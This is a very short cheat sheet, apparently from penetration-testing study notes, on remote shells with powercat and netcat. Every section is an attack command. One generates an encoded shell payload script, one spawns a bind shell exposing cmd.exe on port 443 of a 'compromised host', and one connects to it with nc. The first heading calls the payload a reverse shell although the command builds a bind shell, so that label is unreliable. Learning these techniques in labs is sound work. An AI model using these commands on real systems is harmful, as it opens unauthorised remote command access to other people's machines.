# Generating an encoded reverse shell payload
```ps
powercat -l -p 443 -e cmd.exe -ge > encodedbindshell.ps1
```

# 1) Spawn a bind shell on compromised host
```sh
powercat -l -p 443 -e cmd.exe
```

# 2) connect to bind shell on remote host
```sh
RHOST=10.11.0.4
RPORT=443
nc -nv $RHOST $RPORT
```
